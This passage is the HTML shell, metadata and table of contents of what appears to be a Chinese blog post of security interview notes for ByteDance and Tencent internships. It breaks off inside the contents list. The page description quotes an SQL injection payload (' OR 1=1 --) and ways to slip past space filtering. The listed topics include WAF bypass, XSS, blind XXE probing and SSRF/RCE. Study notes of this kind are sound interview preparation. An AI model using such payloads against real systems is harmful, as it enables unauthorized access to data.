<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="0x19 字节跳动实习面试复盘1. SQL 注入：空格绕过、引号绕过空格绕过在 SQL 注入中，空格可能被过滤或替换为其他字符（如 +）。可以通过以下方式绕过：  使用注释符（&#x2F;* *&#x2F; 或 --）替代空格。 使用 Unicode 编码（如 \x20）表示空格。 使用 SQL 函数（如 CHAR(32)）生成空格。  示例代码： 123456# 原始注入：&#x27; OR 1&#x3D;1 --# 绕过空">
<meta property="og:type" content="article">
<meta property="og:title" content="【工作】面试题整理 大厂常见问题2">
<meta property="og:url" content="https://godreams.cn/2024/03/17/work/workpre5/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="0x19 字节跳动实习面试复盘1. SQL 注入：空格绕过、引号绕过空格绕过在 SQL 注入中，空格可能被过滤或替换为其他字符（如 +）。可以通过以下方式绕过：  使用注释符（&#x2F;* *&#x2F; 或 --）替代空格。 使用 Unicode 编码（如 \x20）表示空格。 使用 SQL 函数（如 CHAR(32)）生成空格。  示例代码： 123456# 原始注入：&#x27; OR 1&#x3D;1 --# 绕过空">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-03-17T08:43:01.000Z">
<meta property="article:modified_time" content="2025-04-02T10:40:52.676Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="null">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【工作】面试题整理 大厂常见问题2</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2024/03/17/work/workpre4/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/03/17/work/workandroid/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godreams.cn/2024/03/17/work/workpre5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godreams.cn/2024/03/17/work/workpre5/&text=【工作】面试题整理 大厂常见问题2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godreams.cn/2024/03/17/work/workpre5/&is_video=false&description=【工作】面试题整理 大厂常见问题2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【工作】面试题整理 大厂常见问题2&body=Check out this article: https://godreams.cn/2024/03/17/work/workpre5/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godreams.cn/2024/03/17/work/workpre5/&title=【工作】面试题整理 大厂常见问题2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godreams.cn/2024/03/17/work/workpre5/&name=【工作】面试题整理 大厂常见问题2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godreams.cn/2024/03/17/work/workpre5/&t=【工作】面试题整理 大厂常见问题2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19-%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A8%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95%E5%A4%8D%E7%9B%98"><span class="toc-number">1.</span> <span class="toc-text">0x19 字节跳动实习面试复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-SQL-%E6%B3%A8%E5%85%A5%EF%BC%9A%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87%E3%80%81%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.</span> <span class="toc-text">1. SQL 注入：空格绕过、引号绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">引号绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS-%E4%B8%AD-SVG-%E7%9A%84%E5%88%A9%E7%94%A8%E5%92%8C%E4%BF%AE%E5%A4%8D"><span class="toc-number">1.2.</span> <span class="toc-text">2. XSS 中 SVG 的利用和修复</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SVG-%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.</span> <span class="toc-text">SVG 的利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.2.2.</span> <span class="toc-text">修复方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-DNS-%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%91%E5%AE%9A"><span class="toc-number">1.3.</span> <span class="toc-text">3. DNS 重定向绑定</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">攻击原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">防御方法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E7%BB%84%E5%92%8C%E9%93%BE%E8%A1%A8%E7%9A%84%E4%BC%98%E5%8A%BF%E5%8F%8A%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.4.</span> <span class="toc-text">数组和链表的优势及原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%B1%82%E9%9D%A2%E8%A7%A3%E9%87%8A%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E5%8C%BA%E5%88%AB"><span class="toc-number">1.5.</span> <span class="toc-text">操作系统层面解释进程和线程区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E5%92%8C%E8%BF%9B%E7%A8%8B%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F%E4%BB%A5%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.6.</span> <span class="toc-text">线程和进程通信方式以及数据安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E9%80%89%E7%94%A8%E5%9C%BA%E6%99%AF%E4%BB%A5%E5%8F%8A%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.7.</span> <span class="toc-text">多进程和多线程的选用场景以及原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87WAF%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">1.8.</span> <span class="toc-text">SQL注入绕过WAF的方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FUZZ%E7%BB%95WAF%E7%9A%84Payload%E9%95%BF%E5%BA%A6"><span class="toc-number">1.9.</span> <span class="toc-text">FUZZ绕WAF的Payload长度</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99%E8%BF%87%E5%93%AA%E4%BA%9B%E6%AD%A3%E5%88%99%E5%8F%8A%E5%85%B7%E4%BD%93%E5%9C%BA%E6%99%AF"><span class="toc-number">1.10.</span> <span class="toc-text">写过哪些正则及具体场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%9F%A5%E8%B5%84%E6%96%99%E4%B8%8D%E8%83%BD%E6%B5%8B%E8%AF%95%E7%9B%B4%E6%8E%A5%E5%86%99IPv4%E7%9A%84%E6%AD%A3%E5%88%99"><span class="toc-number">1.11.</span> <span class="toc-text">不查资料不能测试直接写IPv4的正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E4%BC%9A%E5%AF%BC%E8%87%B4%E6%80%8E%E6%A0%B7%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.12.</span> <span class="toc-text">Java反射机制会导致怎样的安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%92%8CCSRF%E7%9A%84%E7%9B%B8%E5%90%8C%E7%82%B9%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E9%85%8D%E5%90%88%E5%88%A9%E7%94%A8"><span class="toc-number">1.13.</span> <span class="toc-text">XSS和CSRF的相同点以及如何配合利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-TOKEN%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%81%E5%8E%9F%E7%90%86%E5%92%8C%E7%BB%95%E8%BF%87"><span class="toc-number">1.14.</span> <span class="toc-text">CSRF_TOKEN的位置、原理和绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%BD%E5%8F%AF%E8%83%BD%E5%A4%9A%E5%9C%B0%E8%AF%B4%E4%BD%A0%E6%89%80%E7%9F%A5%E9%81%93%E7%9A%84HTTP%E5%A4%B4"><span class="toc-number">1.15.</span> <span class="toc-text">尽可能多地说你所知道的HTTP头</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E5%B8%B8%E8%A7%81%E6%89%AB%E6%8F%8F%E6%96%B9%E5%BC%8F%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8ANSE%E8%84%9A%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">1.16.</span> <span class="toc-text">Nmap常见扫描方式的原理以及NSE脚本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B7%A8%E5%9F%9F%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.17.</span> <span class="toc-text">跨域的解决办法原理以及安全问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-CORS%EF%BC%88%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89"><span class="toc-number">1.17.1.</span> <span class="toc-text">1. CORS（跨域资源共享）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-JSONP%EF%BC%88JSON-with-Padding%EF%BC%89"><span class="toc-number">1.17.2.</span> <span class="toc-text">2. JSONP（JSON with Padding）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86"><span class="toc-number">1.17.3.</span> <span class="toc-text">3. Nginx反向代理</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E5%A4%9A%E8%BF%9B%E7%A8%8B%E5%92%8C%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%A6%82%E4%BD%95%E9%80%89%E6%8B%A9"><span class="toc-number">1.18.</span> <span class="toc-text">Python多进程和多线程如何选择</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%A4%9A%E7%BA%BF%E7%A8%8B"><span class="toc-number">1.18.1.</span> <span class="toc-text">1. 多线程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A4%9A%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.18.2.</span> <span class="toc-text">2. 多进程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84GIL%E9%94%81%E6%9C%AC%E8%B4%A8%E4%B8%8A%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85"><span class="toc-number">1.19.</span> <span class="toc-text">Python的GIL锁本质上做了什么事情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84JVM%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E6%9C%89GCROOT"><span class="toc-number">1.20.</span> <span class="toc-text">Java的JVM为什么要有GCROOT</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84JVM%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9E%83%E5%9C%BE%E6%94%B6%E9%9B%86%E5%99%A8"><span class="toc-number">1.21.</span> <span class="toc-text">Java的JVM有哪些垃圾收集器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E8%AE%A1%E6%95%B0%E5%BC%95%E7%94%A8%E6%9C%BA%E5%88%B6%E7%9A%84%E7%BC%BA%E7%82%B9%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">1.22.</span> <span class="toc-text">垃圾回收计数引用机制的缺点是什么</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E6%80%8E%E4%B9%88%E6%8B%BF%E5%88%B0-Cookie"><span class="toc-number">1.23.</span> <span class="toc-text">CSRF 怎么拿到 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%9F%9F%E5%90%8D%E6%80%8E%E6%A0%B7%E9%80%9A%E8%BF%87-CSRF-%E6%8B%BF-Cookie"><span class="toc-number">1.24.</span> <span class="toc-text">不同域名怎样通过 CSRF 拿 Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Only-%E6%9C%AC%E8%B4%A8%E4%B8%8A%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%E4%BA%8B%E6%83%85"><span class="toc-number">1.25.</span> <span class="toc-text">HTTP-Only 本质上做了什么事情</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91"><span class="toc-number">1.26.</span> <span class="toc-text">平衡二叉树和二叉搜索树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYN-Flood-%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="toc-number">1.27.</span> <span class="toc-text">SYN Flood 攻击原理及解决方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SYN-%E5%8F%8D%E5%90%91%E6%8E%A2%E6%B5%8B%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.28.</span> <span class="toc-text">SYN 反向探测的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-SYN-Cookie-%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">1.29.</span> <span class="toc-text">TCP SYN Cookie 的原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B%E7%9A%84%E6%9C%89%E6%95%88%E6%96%B9%E5%BC%8F"><span class="toc-number">1.30.</span> <span class="toc-text">UDP端口探测的有效方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap%E7%9A%84FIN%E6%89%AB%E6%8F%8F%E5%92%8C%E7%A9%BA%E6%89%AB%E6%8F%8F"><span class="toc-number">1.31.</span> <span class="toc-text">Nmap的FIN扫描和空扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E7%9A%84%E5%BA%8F%E5%88%97%E5%8F%B7%E5%8F%98%E5%8C%96"><span class="toc-number">1.32.</span> <span class="toc-text">三次握手的序列号变化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84%E5%80%BC%E7%B1%BB%E5%9E%8B%E5%92%8C%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.33.</span> <span class="toc-text">Python的值类型和引用类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python%E7%9A%84list%E5%92%8Cdict%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E5%90%97"><span class="toc-number">1.34.</span> <span class="toc-text">Python的list和dict线程安全吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%AE%9E%E9%99%85%E7%9A%84%E4%BE%8B%E5%AD%90%E8%AF%B4%E8%AF%B4SSRF"><span class="toc-number">1.35.</span> <span class="toc-text">结合实际的例子说说SSRF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E5%90%88%E5%AE%9E%E9%99%85%E7%9A%84%E4%BE%8B%E5%AD%90%E8%AE%B2%E8%AE%B2RCE"><span class="toc-number">1.36.</span> <span class="toc-text">结合实际的例子讲讲RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E7%8E%B0%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%BE%88%E5%B0%91%E4%BA%86"><span class="toc-number">1.37.</span> <span class="toc-text">为什么现在文件上传很少了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E8%AF%AD%E4%B9%89%E5%88%86%E6%9E%90%E7%9A%84WAF%E4%BA%86%E8%A7%A3%E5%90%97"><span class="toc-number">1.38.</span> <span class="toc-text">基于语义分析的WAF了解吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java%E7%9A%84Class%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.39.</span> <span class="toc-text">Java的Class文件结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSP%E6%98%AF%E5%A6%82%E4%BD%95%E9%98%B2%E5%BE%A1XSS%E7%9A%84"><span class="toc-number">1.40.</span> <span class="toc-text">CSP是如何防御XSS的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%85%BE%E8%AE%AF"><span class="toc-number">2.</span> <span class="toc-text">腾讯</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BC%81%E4%B8%9A%E6%9C%89HIDS%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E6%80%8E%E4%B9%88%E6%94%BB%E5%87%BB"><span class="toc-number">2.1.</span> <span class="toc-text">1. 企业有HIDS的情况下怎么攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E4%BC%81%E4%B8%9A%E8%A6%81%E6%80%8E%E4%B9%88%E5%81%9A%E6%95%8F%E6%84%9F%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2%E7%9A%84%E9%98%B2%E6%8A%A4"><span class="toc-number">2.2.</span> <span class="toc-text">2. 企业要怎么做敏感数据泄露的防护</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%81%8AHW%E4%B8%AD%E7%9A%84%E7%BB%95%E8%BF%87%E6%88%96%E6%8A%80%E5%B7%A7%E6%80%A7%E5%BC%BA%E7%9A%84%E7%BB%8F%E5%8E%86"><span class="toc-number">2.3.</span> <span class="toc-text">3. 聊HW中的绕过或技巧性强的经历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-TCP%E6%8B%A5%E5%A1%9E%E6%8E%A7%E5%88%B6%E5%92%8C%E6%85%A2%E5%90%AF%E5%8A%A8"><span class="toc-number">2.4.</span> <span class="toc-text">4. TCP拥塞控制和慢启动</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%EF%BC%9A%E6%80%8E%E4%B9%88%E6%94%B6%E9%9B%86%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">5. 谷歌语法：怎么收集子域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%EF%BC%9A%E8%AF%86%E5%88%AB%E6%8C%87%E7%BA%B9%E7%9A%84%E6%97%B6%E5%80%99%EF%BC%8C%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E8%B7%AF%E5%BE%84"><span class="toc-number">2.6.</span> <span class="toc-text">6. 谷歌语法：识别指纹的时候，如何搜索路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95%EF%BC%9A%E5%A6%82%E4%BD%95%E6%90%9C%E7%B4%A2%E5%89%8D%E7%AB%AF%E6%BA%90%E7%A0%81%E7%9A%84%E6%8C%87%E7%BA%B9"><span class="toc-number">2.7.</span> <span class="toc-text">7. 谷歌语法：如何搜索前端源码的指纹</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%80%8E%E4%B9%88%E9%80%9A%E8%BF%87IP%E5%8F%8D%E6%9F%A5%E5%9F%9F%E5%90%8D"><span class="toc-number">2.8.</span> <span class="toc-text">8. 怎么通过IP反查域名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%AD%E5%AD%90%E5%9F%9F%E5%90%8D%E7%9A%84%E6%94%B6%E9%9B%86%E6%89%8B%E6%AE%B5"><span class="toc-number">2.9.</span> <span class="toc-text">9. 信息收集中子域名的收集手段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E9%98%B2%E5%BE%A1"><span class="toc-number">2.10.</span> <span class="toc-text">CSRF 防御</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.11.</span> <span class="toc-text">XXE 无回显探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8"><span class="toc-number">2.12.</span> <span class="toc-text">XSS 硬编码利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF-%E9%98%B2%E5%BE%A1%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.13.</span> <span class="toc-text">CSRF 防御代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XXE-%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8E%A2%E6%B5%8B%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.14.</span> <span class="toc-text">XXE 无回显探测代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E7%A1%AC%E7%BC%96%E7%A0%81%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.15.</span> <span class="toc-text">XSS 硬编码利用代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS-%E8%BD%AC%E4%B9%89%E7%89%B9%E6%AE%8A%E7%BC%96%E7%A0%81%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81%E7%A4%BA%E4%BE%8B"><span class="toc-number">2.16.</span> <span class="toc-text">XSS 转义特殊编码执行代码示例</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-Linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="toc-number">2.17.</span> <span class="toc-text">1. Linux程序的内存布局</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A"><span class="toc-number">2.17.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-data%E6%AE%B5%E5%92%8C-bss%E6%AE%B5%E5%AD%98%E6%94%BE%E7%9A%84%E6%95%B0%E6%8D%AE"><span class="toc-number">2.18.</span> <span class="toc-text">2. .data段和.bss段存放的数据</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-1"><span class="toc-number">2.18.1.</span> <span class="toc-text">示例代码：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%97%B6%E7%9A%84%E6%B5%81%E7%A8%8B%E3%80%81%E5%8F%82%E6%95%B0%E4%BC%A0%E9%80%92%E3%80%81%E5%AF%84%E5%AD%98%E5%99%A8%E5%92%8C%E6%A0%88%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">2.19.</span> <span class="toc-text">3. 函数调用时的流程、参数传递、寄存器和栈的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81%EF%BC%9A-2"><span 